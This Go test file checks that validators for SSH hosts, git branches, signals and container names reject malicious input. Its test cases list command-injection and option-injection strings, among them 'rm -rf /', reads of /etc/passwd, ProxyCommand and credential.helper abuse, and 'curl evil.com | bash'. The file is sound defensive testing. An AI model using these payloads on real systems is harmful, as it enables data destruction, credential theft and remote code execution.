package reconcile

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestValidateHost(t *testing.T) {
	tests := []struct {
		name    string
		host    string
		wantErr bool
		errMsg  string
	}{
		// Valid hosts
		{"simple hostname", "server", false, ""},
		{"hostname with dots", "server.example.com", false, ""},
		{"user@host", "root@192.168.1.1", false, ""},
		{"user with underscore", "deploy_user@server", false, ""},
		{"user with hyphen", "deploy-user@server", false, ""},
		{"hostname with hyphen", "my-server.local", false, ""},
		{"ip address", "192.168.1.1", false, ""},

		// Invalid: empty
		{"empty host", "", true, "host cannot be empty"},

		// Invalid: starts with dash (SSH option injection)
		{"starts with dash", "-oProxyCommand=evil", true, "cannot start with '-'"},
		{"option injection", "-v", true, "cannot start with '-'"},

		// Invalid: shell metacharacters
		{"semicolon injection", "host;rm -rf /", true, "shell metacharacter"},
		{"pipe injection", "host|cat /etc/passwd", true, "shell metacharacter"},
		{"ampersand injection", "host&echo pwned", true, "shell metacharacter"},
		{"dollar injection", "host$(whoami)", true, "shell metacharacter"},
		{"backtick injection", "host`id`", true, "shell metacharacter"},
		{"parenthesis injection", "host()", true, "shell metacharacter"},
		{"curly brace injection", "host{}", true, "shell metacharacter"},
		{"redirect injection", "host>file", true, "shell metacharacter"},
		{"newline injection", "host\necho pwned", true, "shell metacharacter"},
		{"single quote injection", "host'cat /etc/passwd'", true, "shell metacharacter"},
		{"double quote injection", "host\"test\"", true, "shell metacharacter"},

		// Invalid: bad format
		{"invalid chars", "host@with@two@ats", true, "must match"},
		{"space in host", "host name", true, "must match"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateHost(tt.host)
			if tt.wantErr {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.errMsg)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func TestValidateBranch(t *testing.T) {
	tests := []struct {
		name    string
		branch  string
		wantErr bool
		errMsg  string
	}{
		// Valid branches
		{"simple branch", "main", false, ""},
		{"feature branch", "feature/new-feature", false, ""},
		{"with dots", "release-1.0.0", false, ""},
		{"with underscore", "my_branch", false, ""},
		{"with numbers", "branch123", false, ""},
		{"complex path", "refs/heads/main", false, ""},
		{"bugfix branch", "bugfix/issue-42", false, ""},

		// Invalid: empty
		{"empty branch", "", true, "branch cannot be empty"},

		// Invalid: starts with dash (git option injection)
		{"starts with dash", "-branch", true, "cannot start with '-'"},
		{"option injection", "--hard", true, "cannot start with '-'"},

		// Invalid: shell metacharacters
		{"semicolon injection", "branch;rm -rf /", true, "shell metacharacter"},
		{"pipe injection", "branch|cat /etc/passwd", true, "shell metacharacter"},
		{"ampersand injection", "branch&echo pwned", true, "shell metacharacter"},
		{"dollar injection", "branch$(whoami)", true, "shell metacharacter"},
		{"backtick injection", "branch`id`", true, "shell metacharacter"},
		{"parenthesis injection", "branch()", true, "shell metacharacter"},
		{"newline injection", "branch\necho pwned", true, "shell metacharacter"},

		// Invalid: bad format
		{"space in branch", "my branch", true, "must match"},
		{"special chars", "branch@name!", true, "must match"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateBranch(tt.branch)
			if tt.wantErr {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.errMsg)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func TestValidateSignal(t *testing.T) {
	tests := []struct {
		name    string
		signal  string
		wantErr bool
		errMsg  string
	}{
		// Valid signals with SIG prefix
		{"SIGHUP", "SIGHUP", false, ""},
		{"SIGTERM", "SIGTERM", false, ""},
		{"SIGKILL", "SIGKILL", false, ""},
		{"SIGUSR1", "SIGUSR1", false, ""},
		{"SIGUSR2", "SIGUSR2", false, ""},

		// Valid signals without SIG prefix
		{"HUP", "HUP", false, ""},
		{"TERM", "TERM", false, ""},
		{"KILL", "KILL", false, ""},
		{"USR1", "USR1", false, ""},
		{"USR2", "USR2", false, ""},

		// Valid signals lowercase (should normalize)
		{"lowercase sighup", "sighup", false, ""},
		{"lowercase term", "term", false, ""},

		// Invalid: empty
		{"empty signal", "", true, "signal cannot be empty"},

		// Invalid: not in allowlist
		{"invalid signal", "SIGFOO", true, "must be one of"},
		{"numeric signal", "9", true, "must be one of"},
		{"command injection", "SIGHUP;rm", true, "must be one of"},
		{"sigint not allowed", "SIGINT", true, "must be one of"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateSignal(tt.signal)
			if tt.wantErr {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.errMsg)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func TestValidateContainerName(t *testing.T) {
	tests := []struct {
		name          string
		containerName string
		wantErr       bool
		errMsg        string
	}{
		// Valid container names
		{"simple name", "mycontainer", false, ""},
		{"with hyphen", "my-container", false, ""},
		{"with underscore", "my_container", false, ""},
		{"with dot", "my.container", false, ""},
		{"with numbers", "container123", false, ""},
		{"starts with number", "1container", false, ""},
		{"complex name", "traefik-proxy_v2.0", false, ""},

		// Invalid: empty
		{"empty name", "", true, "container name cannot be empty"},

		// Invalid: starts with dash (docker option injection)
		{"starts with dash", "-container", true, "cannot start with '-'"},
		{"option injection", "--rm", true, "cannot start with '-'"},

		// Invalid: shell metacharacters
		{"semicolon injection", "container;rm -rf /", true, "shell metacharacter"},
		{"pipe injection", "container|cat /etc/passwd", true, "shell metacharacter"},
		{"ampersand injection", "container&echo pwned", true, "shell metacharacter"},
		{"dollar injection", "container$(whoami)", true, "shell metacharacter"},
		{"backtick injection", "container`id`", true, "shell metacharacter"},
		{"parenthesis injection", "container()", true, "shell metacharacter"},
		{"newline injection", "container\necho pwned", true, "shell metacharacter"},

		// Invalid: bad format
		{"starts with dot", ".container", true, "must start with alphanumeric"},
		{"starts with underscore", "_container", true, "must start with alphanumeric"},
		{"space in name", "my container", true, "must start with alphanumeric"},
		{"special chars", "container@name!", true, "must start with alphanumeric"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateContainerName(tt.containerName)
			if tt.wantErr {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.errMsg)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

// TestValidationIntegration tests that validation functions correctly reject
// known attack patterns that could lead to command injection.
func TestValidationIntegration(t *testing.T) {
	t.Run("SSH option injection via host", func(t *testing.T) {
		attacks := []string{
			"-oProxyCommand=bash -c 'rm -rf /'",
			"-o ProxyCommand=evil",
			"-L 8080:localhost:80",
			"-R 8080:localhost:80",
		}
		for _, attack := range attacks {
			err := validateHost(attack)
			require.Error(t, err, "should reject: %s", attack)
		}
	})

	t.Run("git option injection via branch", func(t *testing.T) {
		attacks := []string{
			"--upload-pack=evil",
			"-c credential.helper=evil",
			"--config=evil",
		}
		for _, attack := range attacks {
			err := validateBranch(attack)
			require.Error(t, err, "should reject: %s", attack)
		}
	})

	t.Run("command injection via shell metacharacters", func(t *testing.T) {
		attacks := []string{
			"valid;rm -rf /",
			"valid|cat /etc/passwd",
			"valid&& curl evil.com | bash",
			"valid$(curl evil.com)",
			"valid`curl evil.com`",
		}
		for _, attack := range attacks {
			assert.Error(t, validateHost(attack), "host should reject: %s", attack)
			assert.Error(t, validateBranch(attack), "branch should reject: %s", attack)
			assert.Error(t, validateContainerName(attack), "container should reject: %s", attack)
		}
	})
}
